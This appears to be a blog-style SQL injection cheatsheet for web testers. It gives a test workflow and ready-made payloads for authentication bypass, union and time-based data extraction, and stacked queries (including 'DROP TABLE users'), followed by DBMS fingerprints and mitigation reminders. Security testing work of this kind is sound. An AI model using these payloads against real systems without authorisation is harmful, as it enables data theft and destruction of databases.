+++
title = 'SQL Injection Cheatsheet'
date = '2024-01-01'
draft = false
description = 'Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.'
tags = ['sql-injection', 'web-security', 'cheatsheet']
categories = ['cheatsheets']
+++

# SQL Injection Cheatsheet

## Test Workflow

1. **Identify entry points**: parameters, headers, cookies, JSON bodies.
2. **Baseline request**: repeat the request and capture the normal response for comparison.
3. **Break the query**: start with a single quote `'` or double quote `"` to look for syntax errors.
4. **Confirm injection**: use logic tests such as `AND 1=1` (true) vs `AND 1=2` (false).
5. **Escalate**: move from time-based to union-based or stacked queries depending on DBMS.

## Quick Payloads

```http
' OR '1'='1' -- 
" OR "1"="1" -- 
') OR '1'='1' -- 
admin' -- 
admin' #
```

### Numeric Context
```http
1 OR 1=1
1 UNION ALL SELECT NULL
1 ORDER BY 5--
```

### Boolean Tests
```http
1 AND 1=1
1 AND SLEEP(5)
1 AND (SELECT 1 FROM pg_sleep(5))
```

## Union Enumeration

1. **Count columns**: `ORDER BY 1`, `ORDER BY 2`, increment until error.
2. **Match types**: `UNION ALL SELECT NULL,NULL` etc.
3. **Extract data**: replace `NULL` with payloads like `@@version`, `database()`, or `current_user`.

```http
1 UNION ALL SELECT @@version, user()
1 UNION ALL SELECT NULL, table_name FROM information_schema.tables
```

## Time-Based Enumeration

```http
1 AND SLEEP(5)
1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='r') THEN SLEEP(5) ELSE 0 END)
'; WAITFOR DELAY '0:0:5'--
```

## Stacked Queries

```http
'; DROP TABLE users; --
'; INSERT INTO log_table(user, ts) VALUES ('tester', NOW()); --
```

> Only available when the database driver supports multiple statements.

## Detection Cheatcodes

- Check `Content-Length` differences between responses.
- For blind cases, use time or response length changes.
- Monitor HTTP status codes (500 vs 200) during tests.

## DBMS Fingerprints

| Indicator | Likely DBMS |
|-----------|-------------|
| `@@version`, `sysobjects` | SQL Server |
| `information_schema.tables` | MySQL/PostgreSQL |
| `DUAL`, `FROM dual` | Oracle |
| `sqlite_master` | SQLite |

## Mitigation Reminders

- Parameterized queries or stored procedures only.
- Input validation and allow lists (do not rely on blacklist).
- Use least privilege DB accounts.
- Centralize error handling to avoid leaking stack traces.

---

*Always capture before/after evidence and coordinate fixes with developers and database administrators.*

